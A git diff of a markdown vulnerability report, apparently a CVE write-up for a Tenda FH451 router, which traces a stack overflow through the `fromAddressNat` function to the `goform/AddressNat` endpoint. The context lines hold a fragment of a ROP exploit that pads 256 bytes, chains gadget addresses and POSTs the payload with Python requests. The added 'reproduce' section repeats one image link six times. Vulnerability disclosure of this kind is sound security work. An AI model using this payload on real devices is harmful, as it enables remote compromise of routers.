@@ -14,6 +14,7 @@ Cross-referenced location: from the `fromAddressNat` function, routed to `Addres
 ![Image 2](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat2.png)
 Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
 ![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+
 It can be determined that the vulnerability occurs at the page path `goform/AddressNat`.
 
 ## payload
@@ -36,3 +37,11 @@ payload = b'a'*256 + p32(pop_r3)+p32(puts)+p32(mov_r0)+str
 data = {"page": payload}
 res = requests.post(url, data=data)
 ```
+
+# reproduce
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
+![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
